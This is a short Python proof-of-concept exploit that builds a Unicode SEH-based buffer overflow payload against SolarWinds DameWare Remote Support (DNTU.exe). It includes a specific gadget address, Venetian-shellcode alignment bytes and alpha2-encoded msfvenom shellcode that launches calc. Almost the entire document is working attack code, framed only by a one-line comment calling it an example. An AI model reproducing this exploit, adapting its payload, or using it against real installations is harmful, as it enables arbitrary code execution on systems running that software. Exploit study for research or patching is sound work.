# The following code is an example of a commont exploit type known as a 'buffer overflow'

junk1 = "\x41" * 260

# Unicode compatible padding
nseh  = "\x61\x43"

# 0x007a0021 : pop esi # pop edi # ret
# startnull,unicode,asciiprint,ascii {PAGE_EXECUTE_READ} [DNTU.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v12.1.0.34 (C:\Program Files\SolarWinds\DameWare Remote Support\DNTU.exe)
seh   = "\x21\x7a"

# Put shellcode memory address in EAX, push it to the stack and RETN
# 20 bytes
align  = ""
align += "\x43" * 10                # Padding
align += "\x58"                     # POP EAX
align += "\x73"                     # Venetian padding
# 0012F590   83C0 50          ADD EAX,50
align += u"\uC083" + "\x50"         # ADD EAX, 50
align += "\x73"                     # Venetian padding
align += "\x50"                     # PUSH EAX
align += "\x73"                     # Venetian padding
align +=  u'\uC3C3'                 # RETN

# 1348
junk2 = "\x43" * 18

# 7FFDD066 + 2 memory address contains the value FFFF0000
# This value is going to be placed in EBX 
# And it doesn't break the execution flow
junk3 = "\x44" * 550 + u"\uD066" + u"\u7FFD" # u"\xF0FF"

# msfvenom -p windows/exec CMD=calc -f raw > shellcode.raw
# ./alpha2 eax --unicode --uppercase < shellcode.raw
# 508 bytes
shellcode = "PPYAIAIAIAIAQATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JBKLYX4BM0M0KPQP4IZEP17PQTDKPPNPTK1BLLDK1BLTTKT2MXLOVWPJMV01KO6LOLS13LM2NLMPWQHOLMM1WWK2KBPR27TKPRLP4K0JOLTK0LN1D8K3OXKQJ1R1TKPYMPM1HS4KPILXYSOJQ9DKOD4KM1XVNQKO6LGQ8OLMM1WWP89PRUZVLCSMKHOKSMMT2UJD1HDKQHNDKQJ31VTKLL0K4K1HMLM1J3DKKTTKM1HP3YQ4O4ND1K1KQQR9PZ0QKOYPQOQOQJDKLRZKTM1MRJM1DMCUH2KPKPKPPPQXP1TKBOU7KOHUWKL07EFB0V38W6V5WMUMKOJ5OLM63LLJ3PKKIP2UKUWK17MCBRROQZM0B3KOZ51S1Q2LQSKPA"

crash = junk1 + nseh + seh + align + junk2 + shellcode + junk3

print(crash)
